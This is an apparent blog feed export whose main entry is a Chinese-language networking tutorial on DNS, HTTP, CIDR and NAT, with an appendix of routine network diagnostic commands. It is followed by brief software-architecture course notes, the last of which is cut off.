<p>从机器和技术的角度上来说，域名并不是必须的。但 Internet 是由机器和用户共同构成的。鉴于 DNS 对用户的巨大帮助，DNS 已经被当作 TCP/IP 套装不可或缺的一个组成部分。</p>
<p>域名和 IP 地址的对应关系存储在 DNS 服务器(DNS server)中。所谓的 DNS 服务器，是指在网络中进行域名解析的一些服务器(计算机)。这些服务器都有自己的 IP 地址，并使用 DNS 协议(DNS protocol)进行通信。DNS 协议主要基于 UDP，是应用层协议。</p>
<p><img src="/images/14551396313267.jpg" alt=""></p>
<p>DNS 服务器构成一个分级(hierarchical)的树状体系。上图中，每个节点(node)为一个 DNS 服务器，每个节点都有自己的 IP 地址。树的顶端为用户电脑出口处的 DNS 服务器。在 Linux 下，可以使用 <code>cat /etc/resolv.conf</code>，在 Windows 下，可以使用 <code>ipconfig /all</code>，来查询出口 DNS 服务器。树的末端是真正的域名/IP对应关系记录。一次 DNS 查询就是从树的顶端节点出发，最终找到相应末端记录的过程。</p>
<p>中间节点根据域名的构成，将 DNS 查询引导向下一级的服务器。比如说一个域名 cs.berkeley.edu，DNS解析会将域名分割为 cs, berkeley, edu，然后按照相反的顺序查询(edu, berkeley, cs)。出口 DNS 首先根据 edu，将查询指向下一层的 edu 节点。然后 edu 节点根据 berkeley，将查询指向下一层的 berkeley 节点。这台 berkeley 服务器上存储有 cs.berkeley.edu 的 IP 地址。所以，中间节点不断重新定向，并将我们引导到正确的记录。</p>
<p>在整个 DNS 查询过程中，无论是重新定向还是最终取得对应关系，都是用户计算机和 DNS 服务器使用 DNS 协议通信。用户计算机根据 DNS 服务器的反馈，依次与下一层的 DNS 服务器建立通信。用户计算机经过递归查询，最终和末端节点通信，并获得IP地址。</p>
<p><img src="/images/14551396446583.jpg" alt=""></p>
<p>用户计算机的操作系统中的域名解析模块(DNS Resolver)负责域名解析的相关工作。任何一个应用程序(邮件，浏览器)都可以通过调用该模块来进行域名解析。</p>
<p>并不是每次域名解析都要完整的经历解析过程。DNS Resolver 通常有 DNS 缓存(cache)，用来记录最近使用和查询的域名/IP关系。在进行 DNS 查询之前，计算机会先查询 cache 中是否有相关记录。这样，重复使用的域名就不用总要经过整个递归查询过程。</p>
<p><img src="/images/14551396560030.jpg" alt=""></p>
<p>上面的DNS查询均为正向DNS查询：已经知道域名，想要查询对应 IP。而反向 DNS(reverse DNS)是已经知道IP的前提下，想要查询域名。反向 DNS 也是采用分层查询方式，对于一个 IP 地址(比如106.10.170.118)，依次查询in-addr.arpa节点(如果是IPv6，则为ip6.arpa节点)，106节点，10节点，170节点，并在该节点获得 106.10.170.118 对应的域名。</p>
<h3 id="HTTP_u534F_u8BAE_u6982_u89C8"><a href="#HTTP_u534F_u8BAE_u6982_u89C8" class="headerlink" title="HTTP协议概览"></a>HTTP协议概览</h3><p>我在 TCP 流通信中说明了，TCP 协议实现了数据流的传输。然而，人们更加习惯以文件为单位传输资源，比如文本文件，图像文件，超文本文档(hypertext document)。</p>
<p>超文本文档中包含有超链接，指向其他的资源。超文本文档是万维网(World Wide Web，即www)的基础。</p>
<p>HTTP 协议解决文件传输的问题。HTTP 是应用层协议，主要建立在 TCP 协议之上(偶尔也可以 UDP 为底层)。它随着万维网的发展而流行。HTTP 协议目的是，如何在万维网的网络环境下，更好的利用 TCP 协议，以实现文件，特别是超文本文件的传输。</p>
<p>早期的 HTTP 协议主要传输静态文件，即真实存储在服务器上的文件。随着万维网的发展，HTTP 协议被用于传输“动态文件”，服务器上的程序根据 HTTP 请求即时生成的动态文件。我们将 HTT P的传输对象统称为资源(resource)。</p>
<p>HTTP实现了资源的订购和传送。其工作方式类似于快餐点单。</p>
<ol>
<li>请求(request): 顾客向服务员提出请求：“来个鸡腿汉堡”。</li>
<li>回复(response):服务员根据情况，回应顾客的请求</li>
</ol>
<p>根据情况的不同，服务员的回应可能有很多，比如:</p>
<ul>
<li>服务员准备鸡腿汉堡，将鸡腿汉堡交给顾客。（一切OK）</li>
<li>服务员发现自己只是个甜品站。他让顾客前往正式柜台点单。（重新定向）</li>
<li>服务员告诉顾客鸡腿汉堡没有了。(无法找到)</li>
</ul>
<p>交易结束后，服务员就将刚才的交易抛到脑后，准备服务下一位顾客。</p>
<p>HTTP协议的通信是一次 request-responce 交流。客户端(guest)向服务器发出请求(request)，服务器(server)回复(response)客户端。</p>
<p><img src="/images/14551396675029.jpg" alt=""></p>
<p>HTTP协议规定了请求和回复的格式:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">起始行 <span class="comment">(start line)</span></span><br><span class="line">头信息 <span class="comment">(headers)</span></span><br><span class="line"></span><br><span class="line">主体<span class="comment">(entity body)</span></span><br></pre></td></tr></table></figure>
<p>起始行只有一行。它包含了请求/回复最重要的信息。请求的起始行表示(顾客)“想要什么”。回复的起始行表示(后厨)“发生什么”。</p>
<p>头信息可以有多行。每一行是一对键值对(key-value pair)，比如:</p>
<pre><code>Content-type: text/plain 
</code></pre><p>它表示，包含有一个名为 Content-type 的参数，该参数的值为 text/plain。头信息是对起始行的补充。请求的头信息对服务器有指导意义 (好像在菜单上注明: 鸡腿不要辣)。回复的头信息则是提示客户端（比如，在盒子上注明: 小心烫）</p>
<p>主体部分包含了具体的资源。上图的请求中并没有主体，因为我们只是在下单，而不用管后厨送什么东西 (请求是可以有主体内容的)。回复中包含的主体是一段文本文字(Hello World!)。这段文本文字正是顾客所期待的，鸡腿汉堡。</p>
<p>我们深入一些细节。先来看一下请求:</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index<span class="class">.html</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www<span class="class">.example</span><span class="class">.com</span></span><br></pre></td></tr></table></figure>
<p>在起始行中，有三段信息:</p>
<p>GET 方法。用于说明想要服务器执行的操作。<br>/index.html 资源的路径。这里指向服务器上的index.html文件。<br>HTTP/1.1 协议的版本。HTTP第一个广泛使用的版本是1.0，当前版本为1.1。</p>
<p>早期的 HTTP 协议只有 GET 方法。遵从 HTTP 协议，服务器接收到 GET 请求后，会将特定资源传送给客户。这类似于客户点单，并获得汉堡的过程。使用 GET 方法时，是客户向服务器索取资源，所以请求往往没有主体部分。</p>
<p>GET 方法也可以用于传输一些不重要的数据。它是通过改写 URL 的方式实现的。GET 的数据利用 <code>URL?变量名＝变量值</code> 的方法传输。比如向 <a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a> 发送一个变量“q”，它的值为“a”。那么，实际的URL为<a href="http://127.0.0.1?q=a。服务器收到请求后，就可以知道&quot;q&quot;的值为&quot;a&quot;。" target="_blank" rel="external">http://127.0.0.1?q=a。服务器收到请求后，就可以知道&quot;q&quot;的值为&quot;a&quot;。</a></p>
<p>GET 方法之外，最常用的是 POST 方法。它用于从客户端向服务器提交数据。使用 POST 方法时，URL 不再被改写。数据位于 http 请求的主体。POST 方法最用于提交 HTML 的 form 数据。服务器往往会对 POST 方法提交的数据进行一定的处理，比如存入服务器数据库。</p>
<p>样例请求中有一行头信息。该头信息的名字是 Host。HTTP 的请求必须有 Host 头信息，用于说明服务器的地址和端口。HTTP 协议的默认端口是 80，如果在 HOST 中没有说明端口，那么将默认采取该端口。在该例子中，服务器的域名为 www.example.com，端口为 80。域名将通过 DNS 服务器转换为 IP 地址，从而确定服务器在互联网上的地址。</p>
<p>服务器在接收到请求之后，会根据程序，生成对应于该请求的回复，比如:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Content-type</span>: <span class="string">text/plain</span></span><br><span class="line"><span class="attribute">Content-length</span>: <span class="string">12</span></span><br><span class="line"></span><br><span class="line"><span class="erlang-repl"><span class="variable">Hello</span> <span class="variable">World</span><span class="exclamation_mark">!</span></span></span><br></pre></td></tr></table></figure>
<p>回复的起始行同样包含三段信息</p>
<ul>
<li>HTTP/1.1 协议版本</li>
<li>200 状态码(status code)。</li>
<li>OK 状态描述</li>
</ul>
<p>OK 是对状态码 20 0的文字描述，它只是为了便于人类的阅读。电脑只关心三位的状态码(status code)，即这里的 200。200 表示一切 OK，资源正常返回。状态码代表了服务器回应动作的类型。</p>
<p>其它常见的状态码还有:</p>
<ul>
<li>302，重新定向(redirect): 我这里没有你想要的资源，但我知道另一个地方xxx有，你可以去那里找。</li>
<li>404，无法找到(not found): 我找不到你想要的资源，无能为力。</li>
</ul>
<p>(重新定向时，客户端可以根据302的建议前往xxx寻找资源，也可以忽略该建议。)</p>
<p>Content-type 说明了主体所包含的资源的类型。根据类型的不同，客户端可以启动不同的处理程序(比如显示图像文件，播放声音文件等等)。下面是一些常见的资源</p>
<ul>
<li>text/plain 普通文本</li>
<li>text/html HTML 文本</li>
<li>image/jpeg jpeg 图片</li>
<li>image/gif gif 图片</li>
<li>Content-length 说明了主体部分的长度，以字节(byte)为单位。</li>
</ul>
<p>回应的主体部分为一段普通文本，即</p>
<pre><code>Hello World!
</code></pre><p>根据早期的 HTTP 协议，每次 request-reponse 时，都要重新建立 TCP 连接。TCP 连接每次都重新建立，所以服务器无法知道上次请求和本次请求是否来自于同一个客户端。因此，HTTP 通信是无状态(stateless)的。服务器认为每次请求都是一个全新的请求，无论该请求是否来自同一地址。</p>
<p>想象高级餐厅和快餐店。高级餐厅会知道客人所在的位置，如果新增点单，那么服务员知道这和上一单同一桌。而在快餐店中，不好意思，服务员并不记录客人的特征。想再次点单？请重新排队……</p>
<p>随着 HTTP 协议的发展，HTTP 协议允许 TCP 连接复用，以节省建立连接所耗费的时间。但HTTP协议依然保持无状态的特性。</p>
<h2 id="u7EFC_u5408"><a href="#u7EFC_u5408" class="headerlink" title="综合"></a>综合</h2><h3 id="CIDR__u4E0E_NAT"><a href="#CIDR__u4E0E_NAT" class="headerlink" title="CIDR 与 NAT"></a>CIDR 与 NAT</h3><p>IPv4 由于最初的设计原因，长度只有 32 位，所以只提供了大约 40 亿个地址。这造成了 IPv4 地址的耗尽危机。随后，IPv6 被设计出来，并可以提供足够多的 IP 地址。但是 IPv4 与 IPv6 并不兼容，IPv4 向 IPv6 的迁移并不容易。一些技术，比如说这里要说的 CIDR 和 NAT，相继推广。这些技术可以缓解 IPv4 的稀缺状态，成就了 IPv4 一时的逆袭。</p>
<p>CIDR(Classless Inter Domain Routing)改进了传统的 IPv4 地址分类。传统的 IP 分类将 IP 地址直接对应为默认的分类，从而将 Internet 分割为网络。CIDR 在路由表中增加了子网掩码(subnet masking)，从而可以更细分网络。利用 CIDR，我们可以灵活的将某个范围的IP地址分配给某个网络。</p>
<p>1) IP地址分类</p>
<p>在IP接力赛中，我提到，IP地址可以分为如下几类：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP <span class="keyword">class</span>    From          To                 Subnet Mask</span><br><span class="line">A           <span class="number">1.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">126.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">B           <span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">C           <span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>这是最初的IPv4地址分类设计。一个IPv4地址总共有32位，可以分为网络(network)和主机(host)两部分。子网掩码(subnet mask)是用于表示哪些位代表了网络部分。比如如下 subnet mask 255.0.0.0的二进制表示为：</p>
<p>11111111 00000000 00000000 00000000</p>
<p>它的前八位为 1，所以表示IP地址的前八位为网络部分。而后面的 24 位代指该网络的各个主机。一个 A 类网络可以有 224 台主机，也就是 16777216。由于 IPv4 地址已经分好了类，所以当我们拿到一个 IP 地址，我们就可以通过上面查到它的子网掩码。(B类，216; C类，28)</p>
<p>2) 传统路由表</p>
<p>IP分类的方便了IP包的接力。IP包到达某个路由器后，会根据该路由器的路由表(routing table)，来决定接力的下一站。一个传统的路由表看起来是这样的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Destination        Gateway             Iface</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth0</span><br><span class="line"><span class="number">199.165</span><span class="number">.146</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth1</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>            <span class="number">199.165</span><span class="number">.146</span><span class="number">.8</span>       eth1</span><br></pre></td></tr></table></figure>
<p>该路由表代表的网络拓扑如下：</p>
<p><img src="/images/14551396849165.jpg" alt=""></p>
<p>由于 IP 分类，我们不需要记录 subnet mask。当我们要前往 199.165.146.17 时，我们已经知道这台主机位于一个 C 类地址，所以它的子网掩码是 255.255.255.0，也就是说 199.165.146 代表了网络，17 代表了主机。</p>
<p>3) CIDR 路由表</p>
<p>然而，由于默认分类，造成了网络只能按照 A、B、C 的方式存在。假设一个网络(比如 MIT 的网络)分配了一个 A 类地址，那么该网络将容许 16777216 个主机。如果该网络无法用完这些 IP 地址，这些 IP 地址将无法被其他网络使用。再比如上面的网络，199.165.145 必须作为一个整个的网络存在。如果我们只有 10 台主机，那么将会有 200 多个 IP 地址被浪费。CIDR 的本质是在路由表中加入子网掩码，并根据该列信息对网络进行分割，而不是根据默认的 A，B，C 进行分割。比如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Destination        Gateway             Genmask             Iface</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.254</span>    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.254</span>     eth2</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth0</span><br><span class="line"><span class="number">199.165</span><span class="number">.146</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth1</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>            <span class="number">199.165</span><span class="number">.146</span><span class="number">.8</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth1</span><br></pre></td></tr></table></figure>
<p>根据路由表的第一条记录，</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.254</span> (IP address) : <span class="number">11000111</span> <span class="number">10100101</span> <span class="number">10010001</span> <span class="number">11111110</span></span><br><span class="line"><span class="number">255.255</span><span class="number">.255</span><span class="number">.254</span> (subnet mask): <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111110</span> (<span class="number">31</span>个<span class="number">1</span>，<span class="number">1</span>个<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>通过子网掩码可以知道，前 31 位表示网络，最后一位表示主机。子网掩码总是有连续多个 1 组成，比如上面的 31 个 1。所以也可记为 199.165.145.254/31，来同时表示 IP 地址和子网掩码。</p>
<p>路由器将原来的 199.165.145 网络中的一部分分割出来。这一网络可以容纳两台电脑，也就是 199.165.145.254 和 199.165.145.255。这个网络对应网卡是 eth2。当有 IP 包通向这两个 IP 地址时，会前往 eth2，而不是 eth0。</p>
<p>网络拓扑如下：</p>
<p><img src="/images/14551396962662.jpg" alt=""></p>
<p>利用 CIDR，我们可以将 IP 地址根据需要进行分割，从而不浪费 IP 地址。</p>
<p>CIDR 虽然可以更加节约 IP 地址，但它并不能创造新的 IP 地址。IP 地址的耗尽危机并不能因此得到解决。我们来看 IPv4 的第二袭，NAT(Network Address Translation)。</p>
<p>理论上，每个 IP 地址代表了 Internet 上的一个设备。但有一些 IP 地址被保留，用于一些特殊用途。下面三段IP地址被保留用作私有 IP 地址：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">From          To             </span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>      <span class="number">10.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line"><span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>    <span class="number">172.31</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>   <span class="number">192.168</span><span class="number">.255</span><span class="number">.255</span></span><br></pre></td></tr></table></figure>
<p>私有 IP 地址只用于局域网内部。理论上，我们不应该在互联网上看到来自或者发往私有 IP 地址的 IP 包。与私有 IP 地址对应的是全球 IP 地址(global IP address)。</p>
<p>NAT 是为私有网络(private network)服务的。该网络中的主机使用私有IP地址。当私有网络内部主机和外部 Internet 通信时，网关(gateway)路由器负责将私有 IP 地址转换为全球 IP 地址，这个地址转换过程就是 Network Address Translation。网关路由器的 NAT 功能。最极端情况下，我们可以只分配一个全球 IP 地址给网关路由器，而私有网络中的设备都使用私有 IP 地址。由于私有 IP 地址可以在不同私有网络中重复使用，所以就大大减小了设备对 IP 地址的需求。</p>
<p>1) 基础 NAT</p>
<p>NAT 的一种为基础 NAT，也成为一对一(one-to-one)NAT。在基础 NAT 下，网关路由器一一转换一个外部 IP 地址和一个私有 IP 地址。网关路由器保存有 IP 的 NAT 对应关系，比如：</p>
<p><img src="/images/14551397079720.jpg" alt=""></p>
<p>上面网络中，当有 IP 包要前往 199.165.145.1 时，网关路由器会将目的地改写为 10.0.0.1，并接力给私有网络中的 10.0.0.1 的电脑。同样，当 10.0.0.1 的电脑向 Internet 发送 IP 包时，它的发送地为 10.0.0.1。在到达网关路由器时，会将发送地更改为 199.165.145.1。此外，IP 头部的 checksum，以及更高层协议(比如 UDP 和 TCP)中的校验 IP 的 checksum 也会更改。</p>
<p>基础 NAT 尽管是一对一转换 IP 地址，它还是可以减小内部网络对 IP 地址的需求。通常来说，一个局域网中只有少数的设备处于开机状态，并不需要给每个设备对应一个全球 IP 地址。NAT 可以动态的管理全球 IP 地址，并将全球 IP 地址对应到开机设备，从而减小内部网络对 IP 地址的需求。</p>
<p>2) NAPT</p>
<p>NAT 还有一种，被成为 NAPT (Network Address and Port Translation)。在基础 NAT 中，高层协议的端口号并不会改动。NAPT 下，IP 地址和端口号可能同时改动。</p>
<p>我们在 UDP 和 TCP 中提到端口(port)的概念。在建立 UDP 或者 TCP 通信时，我们实际上是用 IP:Port 来代表通信的一端(正如打电话时主机:分机号一样)。NAPT 就是在网关路由器处建立两个通信通道，一个通往内部网络，一个通往外部网络，然后将网关处的通道端口连接，从而让内部和外部通信。比如：</p>
<p><img src="/images/14551397204458.jpg" alt=""></p>
<p>我们看到，通往 IP 199.165.145.1 建立了三个端口的连接：8888, 8889 和 8080。它们分别在 NAPT 处改为通往 10.0.0.1:80, 10.0.0.1:8080 和 10.0.0.3:6000。NAPT 记录有 外部IP:端口 和 内部IP:端口 的一一对应关系。在 IP 包经过时，网关路由器会更改 IP 地址，端口号以及相关的 checksum。</p>
<p>利用 NAPT 我们可以使用一个(或者多个但少量的)外部 IP 和大量的端口号，来对应多个内部 IP 以及相应的端口号，从而大大减小了对全球 IP 地址的需求。</p>
<p>无论是基础 NAT 还是 NAPT，它们的设置都比较复杂，并且从本质上违背了互联网最初的设计理念。但由于 IPv4 的使用惯性，NAT 还是被广泛推广。由于 NAT 所处的网关服务器是理想的设置防火墙的位置，NAT 还往往和防火墙共同建设，以提高私有网络的安全性。</p>
<p>即使是 CIDR 和 NAT 广泛使用，IPv4 还是在不可避免的耗尽。IPv6 正在加紧部署。但上述的两种技术，CIDR 和 NAT 在 IPv6 中同样被采用，所以了解它们依然是有意义的。</p>
<h2 id="u9644_u5F55"><a href="#u9644_u5F55" class="headerlink" title="附录"></a>附录</h2><p>下面是一些Mac OS X下常用的网络诊断命令。它们能帮助我们发现网络问题。有些工具，如 <code>arping</code>, <code>arp-scan</code>，需要借助 HomeBrew 安装。</p>
<p>网络诊断的第一步，是了解自己的设备，比如有哪些接口，IP地址都是什么。</p>
<pre><code># 显示网络接口(interface)信息
# 如接口名称，接口类型，接口的 IP 地址，硬件的 MAC 地址等。
ifconfig
</code></pre><p>ARP 协议用在局域网(LAN)内部。借用 ARP 协议，设备可以知道同一局域网内的 IP-MAC 对应关系。当我们访问一个本地 IP 地址时，设备根据该对应关系，与对应的 MAC 地址通信。通过 ARP 工具，我们可以知道局域网内的通信是否正常。</p>
<pre><code># 显示本地存储的 IP-MAC 对应关系
arp -a

# 经 eth0 接口，发送 ARP 请求，查询 IP 为 192.168.1.1 设备的 MAC 地址
sudo arping -I eth0 192.168.1.1

# 查询整个局域网内的所有IP地址的对应 MAC 地址
sudo arp-scan -l

# 监听 en0 接口的 arp 协议通信
sudo tcpdump -i en0 arp
</code></pre><p>网络层是一个广域的互联网，互联网上的设备用 IP 地址识别。ping 是向某个 IP 地址发送 ICMP 协议的 <code>ECHO_REQUEST</code> 请求。收到该请求的设备，将返回 ICMP 回复。如果 ping 到某个 IP 地址，那么说明该IP地址的设备可以经网络层顺利到达。</p>
<pre><code># 向 IP 地址 192.168.1.255 发送 ICMP 请求
# 如果该地址的 ICMP 没有被禁用，那么在该网上的设备将回复。
ping 192.168.1.1

# 向广播(broadcast)地址 192.168.1.255 发送 ICMP 请求
# 如果 ICMP 没有被禁用，那么在该网上的设备将回复
# 需要注意的是，许多设备会禁用 ICMP
# 如果 ping 不到一个设备，并不一定是网络层故障。
ping 192.168.1.255
</code></pre><p>如果两个设备有相同的 IP 地址，将导致 IP 冲突。许多网络中是由 DHCP 协议自动分配 IP 地址的，这样可以极大的减少 IP 冲突的可能性。DHCP 服务器与设备达成协议，设备将在一定时间内占据某个 IP 地址，而 DHCP 服务器不再把该 IP 地址分配给别人。</p>
<pre><code>sudo ipconfig set en0 DHCP
更新 DHCP 租约。设备将释放 IP 地址，再从 DHCP 服务器重新获得 IP 地址。

sudo ipconfig set en0 INFORM 192.168.0.120
将接口 en0 设定为静态 IP 地址。
</code></pre><p>局域网通过路由器，接入广域的互联网。互联网上的通信往往要经过多个路由器接力。途中路由器的故障，可能导致互联网访问异常。</p>
<pre><code># 显示路由表。从路由表中，可以找到网关(Gateway)
# 网关是通向更加广域网络的出口
netstat -nr

# 追踪到达IP目的地的全程路由
traceroute 74.125.128.99

# 通过ICMP协议，追踪路由
# ICMP协议经常会被禁用，所以会返回&quot;*&quot;的字符串。
traceroute -I 74.125.128.99

# 通过TCP协议，经80端口，追踪路由
# TCP协议的默认端口80很少会被禁用
sudo traceroute -T -p 80 74.125.128.99
</code></pre><p>tcpdump 是一款网络抓包工具。它可以监听网络接口不同层的通信，并过滤出特定的内容，比如特定协议、特定端口等等。我们上面已经使用 tcpdump 监听了 ARP 协议通信。这里我们来看更多的监听方式。</p>
<pre><code># 监听en0接口的所有通信
sudo tcpdump -i en0

# 用ASCII显示en0接口的通信内容
sudo tcpdump -A -i en0 

# 显示en0接口的8080端口的通信
sudo tcpdump -i en0 &apos;port 8080&apos;

# 显示eth1接口，来自192.168.1.200的通信
sudo tcpdump -i eth1 src 192.168.1.200

# 显示eth1接口80端口，目的地为192.168.1.101的通信
sudo tcpdump -i eth1 dst 192.168.1.101 and port 80

# 将lo0接口的通信存入文件record.pcap
sudo tcpdump -w record.pcap -i lo0
</code></pre><p>DNS是在域名和IP之间进行翻译。DNS故障会导致我们无法通过域名访问某个网址。 </p>
<pre><code># DNS域名解析。返回域名对应的IP地址
host www.sina.com.cn
</code></pre><h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="http://www.cnblogs.com/vamei/" target="_blank" rel="external">Vamei</a></li>
<li><a href="http://www.cnblogs.com/maybe2030/" target="_blank" rel="external">Poll 的笔记</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这篇文章主要介绍计算机网络的相关知识，因为网络的重要组成不是是协议，所以很大篇幅会是相关协议以及具体的应用。整体的结构基于 <a href="http://www.cnblogs.com/vamei/">Vamei</a> 博客中的结构（以及一些配图），加上自己在网络上搜集和日常学习中的一些思考，整理成为本文。</p>]]>
    
    </summary>
    
      <category term="协议" scheme="http://wdxtub.com/tags/%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="基础" scheme="http://wdxtub.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="网络" scheme="http://wdxtub.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[软件架构与设计 第 13 课  Implementing Architecture]]></title>
    <link href="http://wdxtub.com/2016/02/10/sad-13/"/>
    <id>http://wdxtub.com/2016/02/10/sad-13/</id>
    <published>2016-02-10T17:25:53.000Z</published>
    <updated>2016-02-10T18:53:00.000Z</updated>
    <content type="html"><![CDATA[<p>上节课我们非常简略地了解了分析架构的大概方法，这节课我们再来看看如何去实现一个架构。</p>
<a id="more"></a>
<hr>
<p>需要理解的概念主要有：</p>
<ul>
<li>实现是一个映射的过程<ul>
<li>组件、连接器、接口、配置、设计思路</li>
<li>动态特性，非功能属性</li>
</ul>
</li>
<li>架构实现的框架</li>
<li>评价框架<ul>
<li>平台支持：编程语言、操作系统</li>
<li>效率</li>
<li>其他：大小、花费、易用性、可靠性、鲁棒性、是否开源、是否便携、是否易于长期维护 </li>
</ul>
</li>
<li>中间件、架构和组件模型的关系<ul>
<li>CORBA, COM/DCOM, JavaBeans, .NET, JMS, etc</li>
</ul>
</li>
<li>搭建新框架<ul>
<li>理解问题本身</li>
<li>让架构符合问题</li>
<li>选择框架范围</li>
<li>避免过度工程</li>
</ul>
</li>
<li>并行和通用化技术</li>
<li>保证架构到实现的一致性</li>
</ul>
<p>下面举两个例子，来看看如何进行分析和实现，这里偷懒就直接用 PPT 了。</p>
<p><img src="/images/14551296610222.jpg" alt=""></p>
<p><img src="/images/14551297754601.jpg" alt=""></p>
<p><img src="/images/14551298029648.jpg" alt=""></p>
<p><img src="/images/14551303007239.jpg" alt=""></p>
<p>基本上还是比较理论的东西，大概看看有个感觉即可。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上节课我们非常简略地了解了分析架构的大概方法，这节课我们再来看看如何去实现一个架构。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="架构" scheme="http://wdxtub.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="设计" scheme="http://wdxtub.com/tags/%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[软件架构与设计 第 12 课 Analysis of Software Architectures]]></title>
    <link href="http://wdxtub.com/2016/02/10/sad-12/"/>
    <id>http://wdxtub.com/2016/02/10/sad-12/</id>
    <published>2016-02-10T17:24:37.000Z</published>
    <updated>2016-02-10T17:46:24.000Z</updated>
    <content type="html"><![CDATA[<p>这节课我们继续回到课本中，来看看如何对软件架构进行分析，以及一些常见的分析技巧。</p>
<a id="more"></a>
<hr>
<p>架构分析是利用架构模型找出重要的系统属性的工作。我们需要知道：</p>
<ul>
<li>问什么问题</li>
<li>为什么要问这些问题</li>
<li>怎么问这些问题</li>
<li>怎么保证这些问题可以找到答案</li>
</ul>
<p>但是在开始分析之前，还需要确定下面的内容：</p>
<ul>
<li>分析的目标<ul>
<li>四个 C: Completeness, Consistency, Compatibility, Correctness</li>
<li>一致性需要包含：Name, Interface, Behavior, Interaction 和  Refinement</li>
</ul>
</li>
<li>分析的范围<ul>
<li>组件和连接器层级</li>
<li>子系统和系统层级</li>
<li>数据层级</li>
</ul>
</li>
<li>架构中最需要关注的部分<ul>
<li>结构特征</li>
<li>行为特征</li>
<li>交互特征</li>
<li>非功能特征</li>
</ul>
</li>
<li>架构模型的正式程度<ul>
<li>非正式模型</li>
<li>半正式模型</li>
<li>正式模型</li>
</ul>
</li>
<li>分析的类型<ul>
<li>静态分析</li>
<li>动态分析</li>
<li>场景驱动分析（可能是静态以及动态的）</li>
</ul>
</li>
<li>自动化的程度<ul>
<li>手动</li>
<li>半自动</li>
<li>全自动</li>
</ul>
</li>
<li>系统相关人员对分析的兴趣<ul>
<li>架构师</li>
<li>开发者</li>
<li>经理</li>
<li>消费者</li>
<li>销售者</li>
